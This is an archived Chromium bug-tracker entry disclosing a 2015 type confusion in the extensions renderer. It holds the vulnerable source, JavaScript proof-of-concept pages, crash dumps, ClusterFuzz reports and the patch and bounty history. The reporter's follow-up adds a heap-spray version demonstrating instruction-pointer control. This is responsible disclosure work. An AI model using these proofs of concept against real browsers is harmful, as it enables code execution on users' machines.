# Type confusion in ObjectBackedNativeHandler::Router

| Field | Value |
|-------|-------|
| **Issue ID** | [40083092](https://issues.chromium.org/issues/40083092) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Platforms** | Windows |
| **Reporter** | se...@gmail.com |
| **Assignee** | rd...@chromium.org |
| **Created** | 2015-10-27 |
| **Bounty** | $5,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36

Steps to reproduce the problem:

What is the expected behavior?

What went wrong?
From src/extensions/renderer/object_backed_native_handler.cc:
void ObjectBackedNativeHandler::Router(
    const v8::FunctionCallbackInfo<v8::Value>& args) {
  v8::HandleScope handle_scope(args.GetIsolate());
  v8::Local<v8::Object> data = args.Data().As<v8::Object>();

  v8::Local<v8::Value> handler_function_value =
      data->Get(v8::String::NewFromUtf8(args.GetIsolate(), kHandlerFunction));
  // See comment in header file for why we do this.
  if (handler_function_value.IsEmpty() ||
      handler_function_value->IsUndefined()) {
    ScriptContext* script_context = ScriptContextSet::GetContextByV8Context(
        args.GetIsolate()->GetCallingContext());
    console::Error(script_context ? script_context->GetRenderFrame() : nullptr,
                   "Extension view no longer exists");
    return;
  }
  DCHECK(handler_function_value->IsExternal());
  static_cast<HandlerFunction*>(
      handler_function_value.As<v8::External>()->Value())->Run(args);
}

The ObjectBackedNativeHandler class uses a v8 object with a property called "handler_function" to store a native function pointer.
While the content frame is being detached, |ObjectBackedNativeHandler::Invalidate| removes this property. So in subsequent 
|ObjectBackedNativeHandler::Router| calls |handler_function_value| could be set to an arbitrary value by an accessor defined
on Object.prototype.

Repro:
<script>
iframe = document.body.appendChild(document.createElement("iframe"));
obj = iframe.contentWindow.Object;
app = iframe.contentWindow.chrome.app;
iframe.remove();
obj.prototype.__defineGetter__("handler_function", function() { return 0xBADDEAD });
app.getDetails();
</script>

(e8.1c78): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome_child!v8::internal::MapWord::ToMap [inlined in chrome_child!v8::internal::JSObject::GetHeaderSize]:
00007fff`ece49810 488b41ff        mov     rax,qword ptr [rcx-1] ds:0baddeac`ffffffff=????????????????
0:000> r
rax=0000000000000000 rbx=0baddead00000000 rcx=0baddead00000000
rdx=0000000000000002 rsi=000000010012c708 rdi=0000000000000000
rip=00007fffece49810 rsp=000000010012c5f8 rbp=000000010012c6b0
 r8=0baddead00000000  r9=0000000000000010 r10=000001ab2687ba69
r11=000000010012c540 r12=000000010012c8a8 r13=00007fffee978764
r14=000000010012c878 r15=000000010298cfd0
iopl=0         nv up ei ng nz ac po cy
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297
chrome_child!v8::internal::MapWord::ToMap [inlined in chrome_child!v8::internal::JSObject::GetHeaderSize]:
00007fff`ece49810 488b41ff        mov     rax,qword ptr [rcx-1] ds:0baddeac`ffffffff=????????????????
0:000> k
Child-SP          RetAddr           Call Site
(Inline Function) --------`-------- chrome_child!v8::internal::MapWord::ToMap [c:\b\build\slave\win64\build\src\v8\src\objects-inl.h @ 1341]
(Inline Function) --------`-------- chrome_child!v8::internal::HeapObject::map [c:\b\build\slave\win64\build\src\v8\src\objects-inl.h @ 1393]
00000001`0012c5f8 00007fff`ece5d258 chrome_child!v8::internal::JSObject::GetHeaderSize [c:\b\build\slave\win64\build\src\v8\src\objects-inl.h @ 2090]
(Inline Function) --------`-------- chrome_child!v8::internal::JSObject::GetInternalField+0x8 [c:\b\build\slave\win64\build\src\v8\src\objects-inl.h @ 2166]
(Inline Function) --------`-------- chrome_child!v8::ExternalValue+0x2f [c:\b\build\slave\win64\build\src\v8\src\api.cc @ 5306]
00000001`0012c600 00007fff`ee97880c chrome_child!v8::External::Value+0x38 [c:\b\build\slave\win64\build\src\v8\src\api.cc @ 5620]
00000001`0012c630 00007fff`ecedde09 chrome_child!extensions::ObjectBackedNativeHandler::Router+0xa8 [c:\b\build\slave\win64\build\src\extensions\renderer\object_backed_native_handler.cc @ 56]
00000001`0012c6c0 00007fff`eced2172 chrome_child!v8::internal::FunctionCallbackArguments::Call+0x79 [c:\b\build\slave\win64\build\src\v8\src\arguments.cc @ 34]
00000001`0012c730 00007fff`ececfcb2 chrome_child!v8::internal::HandleApiCallHelper<0>+0x482 [c:\b\build\slave\win64\build\src\v8\src\builtins.cc @ 1012]
(Inline Function) --------`-------- chrome_child!v8::internal::Builtin_implHandleApiCall+0x3e [c:\b\build\slave\win64\build\src\v8\src\builtins.cc @ 1034]
00000001`0012c860 0000037f`7e50839f chrome_child!v8::internal::Builtin_HandleApiCall+0x52 [c:\b\build\slave\win64\build\src\v8\src\builtins.cc @ 1029]

Version:
Google Chrome 46.0.2490.80 m (64-bit)
Google Chrome 48.0.2547.0 canary (64-bit)

---

I would like to remain anonymous for this report.

Did this work before? N/A 

Chrome version: 46.0.2490.80  Channel: stable
OS Version: 6.3
Flash Version: Shockwave Flash 19.0 r0

## Timeline

### cl...@chromium.org (2015-10-27)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=4575276707610624

### me...@chromium.org (2015-10-27)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-10-27)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5927587006644224

### me...@chromium.org (2015-10-27)

Devlin: Can you please take a look and reassign if necessary? Thanks.

### me...@chromium.org (2015-10-27)

FWIW, I had to explicitly add <body></body> tags to get the repro working.

### cl...@chromium.org (2015-10-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5927587006644224

Uploader: meacer@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  v8::External::Value
  extensions::ObjectBackedNativeHandler::Router
  v8::internal::FunctionCallbackArguments::Call
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=172836:173286

Minimized Testcase (0.28 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97-vZ3ne9kAKIW7AdGmod4OvM4fLhNK_lVhNvuIxq9zYZ9kGy-pz7_f5PvuPaN-xj81VJ_7FIl_CHg2cpY9FwogjTV15GIdUQMW4o6Z7Bk7uXxSsRv5LdjYVgo5yYDdFjHLcvBvV4GQJUBo9a1o-m9ezpZpSQ
<body>
<script>
iframe = document.body.appendChild(document.createElement("iframe"));
obj = iframe.contentWindow.Object;
app = iframe.contentWindow.chrome.app;
iframe.remove();
obj.prototype.__defineGetter__("handler_function", function() { return 0xBADDEAD });
app.getDetails();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2015-10-28)

[Empty comment from Monorail migration]

### se...@gmail.com (2015-10-28)

Sorry for the missing <body> tag.
I've updated the repro case to demonstrate EIP control on Chrome 32-bit.

<body>
<script>
sprayBlock = new Int32Array(1024 * 1024 / 4);
for(var i = 0; i < sprayBlock.length; ++i)
  sprayBlock[i] = i & 1 ? 0xdeaddead : 0xa0a0a0a0;
spray = new Int32Array(1024 * 1024 * 1000 / 4);
for (var i = 0; i < 1000; ++i)
  spray.set(sprayBlock, 1024 * 1024 / 4 * i);

iframe = document.body.appendChild(document.createElement("iframe"));
obj = iframe.contentWindow.Object;
app = iframe.contentWindow.chrome.app;
iframe.remove();
obj.prototype.__defineGetter__("handler_function", function() { return {a: 0xa0a0a0a0 >> 1} });
app.getDetails();
</script>
</body>

(3b4.5d0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
deaddead ??              ???
3:043:x86> r
eax=addeada0 ebx=00d8e904 ecx=2188a14d edx=2188a14d esi=00d8e958 edi=00d8e8ac
eip=deaddead esp=00d8e8a4 ebp=00d8e8ec iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
deaddead ??              ???
3:043:x86> k
ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00d8e8a0 5a01d0ad 0xdeaddead
(Inline) -------- chrome_child!base::Callback<void __cdecl(v8::FunctionCallbackInfo<v8::Value> const &)>::Run+0x6 [c:\b\build\slave\win\build\src\base\callback.h @ 396]
00d8e8ec 59f02304 chrome_child!extensions::ObjectBackedNativeHandler::Router+0x8c [c:\b\build\slave\win\build\src\extensions\renderer\object_backed_native_handler.cc @ 56]
00d8e920 59f020a7 chrome_child!v8::internal::FunctionCallbackArguments::Call+0x7e [c:\b\build\slave\win\build\src\v8\src\arguments.cc @ 34]

### oc...@chromium.org (2015-10-28)

I can give a shot at this too if rdevlin.cronin@ hasn't had time to look at this one yet.

### rd...@chromium.org (2015-10-28)

I'll probably be able to get to this before the end of the week, but if you're looking for stuff to do, I'm more than happy to pass it off. :)

### oc...@chromium.org (2015-10-28)

I'll take this for now then :)

### oc...@chromium.org (2015-10-28)

Since rdevlin.cronin already had a patch, I'm giving this back :)

### me...@chromium.org (2015-10-28)

[Empty comment from Monorail migration]

### rd...@chromium.org (2015-10-30)

Fixed in commit a5ecbc86a598e29ce3a2424c9c5386bfba4e9b74.

meacer@, can commit bot comment on security embargo bugs?  This is the second one where we haven't gotten an automated "patch landed" message.

### in...@chromium.org (2015-10-30)

Can you email laforge for c#14 ?

### cl...@chromium.org (2015-10-30)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-10-31)

ClusterFuzz has detected this issue as fixed in range 356784:357082.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5927587006644224

Uploader: meacer@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN
Crash Address: 0x000000000000
Crash State:
  v8::External::Value
  extensions::ObjectBackedNativeHandler::Router
  v8::internal::FunctionCallbackArguments::Call
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=172836:173286
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=356784:357082

Minimized Testcase (0.28 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97-vZ3ne9kAKIW7AdGmod4OvM4fLhNK_lVhNvuIxq9zYZ9kGy-pz7_f5PvuPaN-xj81VJ_7FIl_CHg2cpY9FwogjTV15GIdUQMW4o6Z7Bk7uXxSsRv5LdjYVgo5yYDdFjHLcvBvV4GQJUBo9a1o-m9ezpZpSQ
<body>
<script>
iframe = document.body.appendChild(document.createElement("iframe"));
obj = iframe.contentWindow.Object;
app = iframe.contentWindow.chrome.app;
iframe.remove();
obj.prototype.__defineGetter__("handler_function", function() { return 0xBADDEAD });
app.getDetails();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect,try re-doing that job on the test case report page.

### ti...@google.com (2015-11-23)

[Empty comment from Monorail migration]

### ss...@google.com (2015-11-23)

Merge approved for M47 (branch 2526)

### rd...@chromium.org (2015-11-24)

Merged: commit 9ab386229479ade5538db5a224dbae3998983240

### ti...@google.com (2015-11-24)

[Empty comment from Monorail migration]

### ss...@google.com (2015-11-24)

This change has been reverted from M47 due to compile failures. Please talk to me if you have a clean fix and need to merge back into M47. Removing the merge approval for now.

### rd...@chromium.org (2015-11-24)

@22 - updated patch to merge is here: https://codereview.chromium.org/1465223004, which I hope compiles fine.  Of course, it's impossible to test or build, and our strategy for merging is always "commit and pray". ;)

Good to merge?

### ss...@google.com (2015-11-25)

Approved for M47 (branch 2526)
We will know in today's evening build if this is still causing a compile failure. If that happens, I will let you know, please revert in that case. 

### ti...@google.com (2015-11-28)

#24: Just confirming that this is going into a post-stable patch and not the initial M47 - correct?

### ss...@google.com (2015-11-30)

Correct.

### ss...@google.com (2015-12-02)

Reminder to please merge this change in, it has been approved. If it was merged and bugdroid didn't catch it, then please update the label. 

### rd...@chromium.org (2015-12-02)

Already merged in d5d3b65b9c43a97f35dabe32fa6f399ab5e3d106.

### ti...@google.com (2015-12-07)

[Empty comment from Monorail migration]

### ti...@google.com (2015-12-08)

Congrats - $5000 for this report! Keep them coming - I'll add this to the next payment run. Cheers!

### ti...@google.com (2015-12-14)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-06)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

- Your friendly ClusterFuzz

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### gl...@google.com (2019-10-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-10-28)

This issue was migrated from crbug.com/chromium/548273?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083092)*
